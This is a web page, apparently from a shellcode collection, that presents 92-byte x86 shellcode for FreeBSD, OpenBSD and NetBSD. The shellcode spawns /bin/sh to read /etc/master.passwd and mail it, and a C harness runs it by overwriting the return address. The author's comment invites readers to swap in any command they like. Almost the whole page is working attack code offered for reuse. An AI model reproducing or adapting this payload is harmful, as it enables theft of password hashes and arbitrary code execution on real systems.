<html><head><title>BSD/x86 - cat /etc/master.passwd &amp; mail root@localhost - 92 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
   *BSD version
   FreeBSD, OpenBSD, NetBSD.

   s0t4ipv6@shellcode.com.ar

   92 bytes.

   _execve(/bin/sh -c &quot;/bin/cat /etc/master.passwd|mail root@localhost&quot;);
   pueden reemplzar el comando por lo que se les ocurra.
*/

char shellcode[]=

    &quot;\xeb\x25&quot;             /* jmp     &lt;_shellcode+39&gt;         */
    &quot;\x59&quot;                 /* popl    %ecx                   */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x68\x6e\x2f\x73\x68&quot; /* push    $0x68732f6e            */
    &quot;\x68\x2f\x2f\x62\x69&quot; /* push    $0x69622f2f            */
    &quot;\x89\xe3&quot;             /* movl    %esp,%ebx              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x66\x68\x2d\x63&quot;     /* pushw   $0x632d                */
    &quot;\x89\xe7&quot;             /* movl    %esp,%edi              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x51&quot;                 /* pushl   %ecx                   */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\x53&quot;                 /* pushl   %ebx                   */
    &quot;\x89\xe7&quot;             /* movl    %esp,%edi              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\x53&quot;                 /* pushl   %ebx                   */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\xb0\x3b&quot;             /* movb    $0x0b,%al              */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\xe8\xd6\xff\xff\xff&quot; /* call    &lt;_shellcode+2&gt;          */
    &quot;/bin/cat /etc/master.passwd|mail root@localhost&quot;;

main()
{
   int *ret;
   printf(&quot;Shellcode lenght=%d\n&quot;,sizeof(shellcode));
   ret=(int*)&amp;ret+2;
   (*ret)=(int)shellcode;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
